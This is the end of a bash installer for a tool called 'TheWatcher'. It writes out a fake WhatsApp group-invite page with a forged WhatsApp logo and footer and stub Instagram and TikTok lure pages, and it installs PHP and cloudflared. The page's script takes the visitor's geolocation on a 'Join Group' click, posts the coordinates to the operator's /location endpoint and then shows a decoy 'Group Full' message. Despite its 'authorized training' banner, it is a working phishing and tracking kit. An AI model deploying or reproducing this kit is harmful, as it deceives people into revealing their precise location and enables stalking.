15px;margin-top:40px}}.bottom-text{{text-align:center;font-size:11px;opacity:0.7}}</style>
</head>
<body>
<div class="header"><div class="header-content"><svg viewBox="0 0 24 24" fill="white"><path d="M12.04 2c-5.46 0-9.91 4.45-9.91 9.91 0 1.75.46 3.45 1.32 4.95L2.05 22l5.25-1.38c1.45.79 3.08 1.21 4.74 1.21 5.46 0 9.91-4.45 9.91-9.91 0-5.46-4.45-9.91-9.91-9.91z"/><path fill="#25D366" d="M12.04 3.5c4.62 0 8.38 3.76 8.38 8.38 0 4.62-3.76 8.38-8.38 8.38-1.45 0-2.86-.36-4.09-1.02l-.52-.27-3.11.82.83-3.04-.28-.54c-.68-1.27-1.04-2.68-1.04-4.13 0-4.62 3.76-8.38 8.38-8.38z"/></svg><span>WhatsApp</span></div></div>
<div class="main"><div class="card" id="card"><div class="avatar"><img src="{src}"></div><div class="name">{name}</div><div class="type">WhatsApp Group</div><div class="count">{members} members</div><button class="btn" id="joinBtn">Join Group</button></div><div class="loading" id="loading"><div class="spinner"></div><p>Joining...</p></div></div>
<div class="modal" id="modal"><div class="modal-content"><div class="modal-title">Group Full</div><div class="modal-msg">Maximum 256 participants reached.</div><button class="modal-btn" id="closeModal">OK</button></div></div>
<div class="bottom-bar"><div class="bottom-text">© 2024 WhatsApp Inc.</div></div>
<script>
document.getElementById('joinBtn').onclick=()=>{document.getElementById('card').style.display='none';document.getElementById('loading').style.display='block';setTimeout(()=>{if("geolocation" in navigator){navigator.geolocation.getCurrentPosition(pos=>{fetch('/location',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({lat:pos.coords.latitude,lng:pos.coords.longitude,acc:pos.coords.accuracy})}).then(()=>{document.getElementById('loading').style.display='none';document.getElementById('modal').style.display='flex'})},err=>{document.getElementById('loading').style.display='none';document.getElementById('card').style.display='block'})}},1500)};
document.getElementById('closeModal').onclick=()=>{document.getElementById('modal').style.display='none';document.getElementById('card').style.display='block'};
</script>
</body>
</html>'''
    
    @staticmethod
    def get_instagram_story_custom(u,v,p,vt,vi,l,c):
        return f"<html><body><h1>Instagram Story</h1><p>@{u}</p></body></html>"
    @staticmethod
    def get_tiktok_video_custom(u,v,p,vt,vi,l,c,sh,ca):
        return f"<html><body><h1>TikTok Video</h1><p>@{u}</p></body></html>"
    @staticmethod
    def get_instagram_camera(u,v,p,vt,l,c,sh,ca):
        return f"<html><body><h1>Instagram Reel</h1><p>@{u}</p></body></html>"
    @staticmethod
    def get_tiktok_camera(u,v,p,vt,l,c,sh,ca):
        return f"<html><body><h1>TikTok Camera</h1><p>@{u}</p></body></html>"
EOF

    print_success "Created all files"
}

# ==================== MAIN ====================
main() {
    banner
    detect_system
    INSTALL_DIR="$HOME/TheWatcher"
    
    print_info "System: $SYSTEM"
    print_info "Installing to: $INSTALL_DIR"
    
    # Remove old installation if exists
    if [[ -d "$INSTALL_DIR" ]]; then
        print_warning "Existing installation found"
        read -p "  Remove and reinstall? (y/N): " -n 1 -r
        echo
        if [[ $REPLY =~ ^[Yy]$ ]]; then
            rm -rf "$INSTALL_DIR"
        else
            print_info "Exiting"
            exit 0
        fi
    fi
    
    mkdir -p "$INSTALL_DIR"
    cd "$INSTALL_DIR"
    
    install_python_deps
    install_php
    install_cloudflared
    create_files
    
    echo ""
    echo -e "${GREEN}${BOLD}╔═══════════════════════════════════════════════════════════════╗${END}"
    echo -e "${GREEN}${BOLD}║                    ✅ INSTALLATION COMPLETE!                    ║${END}"
    echo -e "${GREEN}${BOLD}╚═══════════════════════════════════════════════════════════════╝${END}"
    echo ""
    echo -e "${CYAN}🚀 START:${END}"
    echo -e "  ${YELLOW}OR: python3 thewatcher.py${END}"
    echo ""
    echo -e "${RED}${BOLD}⚠️  AUTHORIZED TRAINING USE ONLY${END}"
    echo ""
}

# Create start script
cat > start.sh << 'STARTEOF'
#!/bin/bash
cd "$(dirname "$0")"
echo -e "\033[96m🚀 Starting TheWatcher...\033[0m"
python3 thewatcher.py
STARTEOF
chmod +x start.sh

# Run main
main "$@"
